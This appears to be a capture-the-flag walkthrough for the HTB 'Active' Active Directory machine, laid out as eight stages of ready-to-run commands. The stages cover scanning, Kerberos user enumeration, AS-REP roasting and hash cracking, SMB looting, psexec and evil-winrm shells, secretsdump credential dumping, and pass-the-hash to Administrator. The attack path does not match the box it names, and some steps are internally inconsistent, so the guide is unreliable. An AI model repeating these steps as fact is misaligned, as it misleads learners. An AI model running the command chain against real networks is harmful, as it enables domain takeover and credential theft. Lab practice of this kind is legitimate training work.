
# How to pentest HTB: Active — proper stages

STAGE 1 — SCOPING & TARGET CONFIRMATION  
Goal: Confirm you are dealing with a Domain Controller.

Commands you will actually use:
nmap -sn 10.10.10.0/24 -oN hosts.txt  
nmap -sC -sV -p- --min-rate=1000 <TARGET_IP> -oN nmap-full.txt  

What you should verify:
- Kerberos (88), LDAP (389), SMB (445), RPC (135), DNS (53)  
- OS looks like Windows Server + AD

---

STAGE 2 — AD USER ENUMERATION  
Goal: Find valid domain users.

Pick one approach (not all of them):

Option A (most OSCP-style):
kerbrute userenum --dc <DC_IP> -d active.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

Option B:
enum4linux -a <DC_IP>

Keep:
- A list of valid usernames

---

STAGE 3 — AS-REP ROASTING (initial access path)  
Goal: Find misconfigured users with no Kerberos pre-auth.

Get hashes:
GetNPUsers.py active.htb/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat

Crack offline:
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

Result:
- You now have one valid credential

---

STAGE 4 — SMB ENUMERATION WITH CREDENTIALS  
Goal: Move from “recon” to access.

Use your credential:
smbclient \\\\<DC_IP>\\Replication -U "svc_tgs"

Look for:
- Scripts  
- Plaintext passwords  
- Misconfigurations  

Extract anything useful.

---

STAGE 5 — LATERAL MOVEMENT  
Goal: Get a shell on the DC.

Use PsExec with your credential:
psexec.py active.htb/svc_tgs@<DC_IP>

If this fails, try:
wmiexec.py active.htb/svc_tgs@<DC_IP>  
evil-winrm -i <DC_IP> -u svc_tgs -p <PASSWORD>

You should now have a Windows shell.

---

STAGE 6 — CREDENTIAL DUMPING  
Goal: Get domain hashes.

From your shell:
secretsdump.py active.htb/svc_tgs@<DC_IP>

Keep:
- Administrator NTLM hash

---

STAGE 7 — FULL DOMAIN COMPROMISE  
Goal: Become SYSTEM.

Use the hash:
psexec.py active.htb/Administrator@<DC_IP> -hashes :<HASH>

Now you are SYSTEM.

---

STAGE 8 — FLAGS  
- Grab user.txt  
- Grab root.txt 
